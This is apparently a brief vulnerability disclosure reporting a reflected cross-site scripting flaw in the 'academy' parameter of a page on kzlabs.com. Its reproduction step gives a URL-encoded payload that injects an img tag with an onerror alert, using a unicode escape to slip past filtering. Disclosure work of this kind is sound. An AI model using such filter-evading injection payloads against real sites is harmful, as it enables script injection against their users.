## Title
Reflected based Cross-Site Scripting (XSS) in "academy" field

## Summary
I found a reflected based Cross-Site Scripting vulnerability in the "academy" field in following url
...
## Steps to Reproduce
1. Open the following URL in a browser: https://kzlabs.com/13.php?academy=sk404%22%3E%3CImG+src=x+onerror=\u0061lert(%27XSS%27)// 
...
<img width="3000" height="1182" alt="image" src="https://github.com/user-attachments/assets/61f924ea-bae5-429b-a88d-c5c919da176b" />
